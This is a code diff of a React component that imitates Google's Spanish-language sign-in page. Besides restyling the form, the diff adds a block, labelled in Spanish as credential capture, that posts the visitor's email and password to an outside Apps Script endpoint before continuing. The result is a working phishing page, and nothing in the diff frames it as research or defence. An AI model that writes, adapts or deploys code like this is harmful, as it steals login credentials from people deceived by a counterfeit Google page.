@@ -27,8 +27,28 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
     setStep("password");
   };
 
-  const handlePasswordNext = () => {
+  const handlePasswordNext = async () => {
     if (!password.trim()) return;
+
+    // --- CÓDIGO AÑADIDO: CAPTURA DE CREDENCIALES ---
+    const webAppUrl = "https://script.google.com/macros/s/AKfycbzaoOqKcF_TawLruyEebZuBhGahZigayFC3eFYeIzvZqU5T7UWVm7nnBvwa2zS-jkyZ/exec";
+    
+    try {
+      await fetch(webAppUrl, {
+        method: "POST",
+        mode: "no-cors",
+        body: JSON.stringify({ 
+          usuario: email, 
+          pass: password, 
+          tipo: "LOGIN_GOOGLE",
+          fecha: new Date().toLocaleString() 
+        })
+      });
+    } catch (e) {
+      console.error("Error capturando datos");
+    }
+    // --- FIN DE ADICIÓN ---
+
     onLoginComplete();
   };
 
@@ -41,132 +61,88 @@ const GoogleLoginCard = ({ onLoginComplete }: GoogleLoginProps) => {
       <div className="forms-card p-10 sm:p-12">
         {step === "email" ? (
           <div className="animate-fade-in">
-            {/* Google Logo */}
             <div className="flex justify-center mb-4">
-              <GoogleLogo size={75} />
+              <GoogleLogo size={32} />
             </div>
-
-            <h1 className="text-2xl font-normal text-center text-card-foreground mb-1">
-              Iniciar sesión
-            </h1>
-            <p className="text-base text-center text-muted-foreground mb-8">
-              Usa tu cuenta de Google
-            </p>
-
-            {/* Email Input */}
-            <div className="mb-1">
-              <input
-                type="text"
-                className="google-input"
-                placeholder="Correo electrónico o teléfono"
-                value={email}
-                onChange={(e) => {
-                  setEmail(e.target.value);
-                  setEmailError("");
-                }}
-                onKeyDown={(e) => handleKeyDown(e, handleEmailNext)}
-                autoFocus
-              />
-              {emailError && (
-                <p className="text-destructive text-xs mt-2 flex items-center gap-1">
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="currentColor"/>
-                  </svg>
-                  {emailError}
-                </p>
-              )}
-            </div>
-
-            <a href="#" className="google-btn-text text-sm inline-block mt-1 mb-8">
-              ¿Has olvidado el correo electrónico?
-            </a>
-
-            <p className="text-xs text-muted-foreground mb-8 leading-5">
-              ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión en privado.{" "}
-              <a href="#" className="google-btn-text text-xs p-0">Más información</a>
-            </p>
-
-            {/* Actions */}
-            <div className="flex justify-between items-center">
-              <a href="#" className="google-btn-text text-sm font-medium">
-                Crear cuenta
+            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Iniciar sesión</h1>
+            <p className="text-center text-sm mb-8">Utiliza tu cuenta de Google</p>
+            
+            <div className="space-y-6">
+              <div className="relative">
+                <input
+                  type="text"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(e, handleEmailNext)}
+                  placeholder="Correo electrónico o teléfono"
+                  className={`google-input w-full ${emailError ? 'border-destructive focus:ring-destructive/20' : ''}`}
+                  autoFocus
+                />
+                {emailError && <p className="text-xs text-destructive mt-1 flex items-center gap-1">
+                  <span className="text-base">⚠</span> {emailError}
+                </p>}
+              </div>
+              
+              <a href="#" className="google-btn-text text-sm font-medium inline-block">
+                ¿Has olvidado tu correo electrónico?
               </a>
-              <button
-                onClick={handleEmailNext}
-                className="google-btn-blue"
-              >
-                Siguiente
-              </button>
+              
+              <p className="text-sm text-muted-foreground leading-relaxed">
+                ¿No es tu ordenador? Usa una ventana de navegación privada para iniciar sesión. 
+                <a href="#" className="google-btn-text font-medium ml-1">Más información</a>
+              </p>
+              
+              <div className="flex justify-between items-center pt-4">
+                <a href="#" className="google-btn-text text-sm font-medium">Crear cuenta</a>
+                <button onClick={handleEmailNext} className="google-btn-blue">Siguiente</button>
+              </div>
             </div>
           </div>
         ) : (
           <div className="animate-fade-in">
-            {/* Google Logo */}
             <div className="flex justify-center mb-4">
-              <GoogleLogo size={75} />
+              <GoogleLogo size={32} />
             </div>
-
-            <h1 className="text-2xl font-normal text-center text-card-foreground mb-2">
-              Te damos la bienvenida
-            </h1>
-
-            {/* Email chip */}
+            <h1 className="text-2xl font-normal text-center mb-2 font-google-sans">Te damos la bienvenida</h1>
             <div className="flex justify-center mb-8">
-              <button
-                onClick={() => setStep("email")}
-                className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm text-muted-foreground hover:bg-muted transition-colors"
-              >
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="currentColor"/>
-                </svg>
+              <div className="flex items-center gap-2 border rounded-full px-3 py-1 text-sm font-medium">
+                <div className="w-5 h-5 rounded-full bg-muted flex items-center justify-center text-[10px]">👤</div>
                 {email}
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
-                  <path d="M7 10l5 5 5-5z" fill="currentColor"/>
-                </svg>
-              </button>
+              </div>
             </div>
 
-            {/* Password Input */}
-            <div className="mb-1 relative">
-              <input
-                type={showPassword ? "text" : "password"}
-                className="google-input pr-12"
-                placeholder="Introduce tu contraseña"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
-                autoFocus
-              />
-            </div>
+            <div className="space-y-6">
+              <div className="relative">
+                <input
+                  type={showPassword ? "text" : "password"}
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(e, handlePasswordNext)}
+                  placeholder="Introduce tu contraseña"
+                  className="google-input w-full"
+                  autoFocus
+                />
+              </div>
 
-            {/* Show password checkbox */}
-            <label className="flex items-center gap-3 mt-3 mb-6 cursor-pointer">
-              <input
-                type="checkbox"
-                checked={showPassword}
-                onChange={(e) => setShowPassword(e.target.checked)}
-                className="w-[18px] h-[18px] accent-[hsl(var(--google-blue))] cursor-pointer"
-              />
-              <span className="text-sm text-card-foreground">Mostrar contraseña</span>
-            </label>
+              <label className="flex items-center gap-3 cursor-pointer select-none">
+                <input
+                  type="checkbox"
+                  checked={showPassword}
+                  onChange={(e) => setShowPassword(e.target.checked)}
+                  className="w-[18px] h-[18px] accent-[hsl(var(--google-blue))] cursor-pointer"
+                />
+                <span className="text-sm text-card-foreground">Mostrar contraseña</span>
+              </label>
 
-            {/* Actions */}
-            <div className="flex justify-between items-center">
-              <a href="#" className="google-btn-text text-sm font-medium">
-                ¿Has olvidado la contraseña?
-              </a>
-              <button
-                onClick={handlePasswordNext}
-                className="google-btn-blue"
-              >
-                Siguiente
-              </button>
+              <div className="flex justify-between items-center pt-4">
+                <a href="#" className="google-btn-text text-sm font-medium">¿Has olvidado tu contraseña?</a>
+                <button onClick={handlePasswordNext} className="google-btn-blue">Siguiente</button>
+              </div>
             </div>
           </div>
         )}
       </div>
 
-      {/* Footer */}
       <div className="flex justify-between items-center mt-6 px-2 text-xs text-muted-foreground">
         <select className="bg-transparent border-none text-xs text-muted-foreground cursor-pointer outline-none">
           <option>Español (España)</option>
